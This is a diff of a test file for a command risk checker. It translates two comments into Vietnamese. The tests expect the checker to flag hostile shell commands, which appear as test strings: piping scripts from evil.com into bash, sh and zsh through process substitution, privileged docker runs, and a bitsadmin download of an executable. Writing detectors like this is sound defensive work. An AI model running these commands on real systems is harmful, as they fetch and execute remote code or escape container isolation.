@@ -212,7 +212,7 @@ MIT
           .ruiRoCao,
       ).toBe(true);
 
-      // 2. Process Substitution
+      // 2. Thay thế tiến trình (Process Substitution)
       expect(kiemTraRuiRoCao('bash <(curl -s https://evil.com/install.sh)').ruiRoCao).toBe(true);
       expect(kiemTraRuiRoCao('sh <(wget -qO- https://evil.com/install.sh)').ruiRoCao).toBe(true);
       expect(kiemTraRuiRoCao('zsh <(curl -fsSL https://raw.evil.com/script)').ruiRoCao).toBe(true);
@@ -222,7 +222,7 @@ MIT
       expect(kiemTraRuiRoCao('docker run --cap-add SYS_ADMIN ubuntu').ruiRoCao).toBe(true);
       expect(kiemTraRuiRoCao('docker run --pid=host -d container').ruiRoCao).toBe(true);
 
-      // 4. Windows LoLBin bitsadmin
+      // 4. Công cụ có sẵn Windows bitsadmin (LoLBin)
       expect(
         kiemTraRuiRoCao('bitsadmin /transfer jobname https://evil.com/mal.exe C:\\temp\\mal.exe')
           .ruiRoCao,
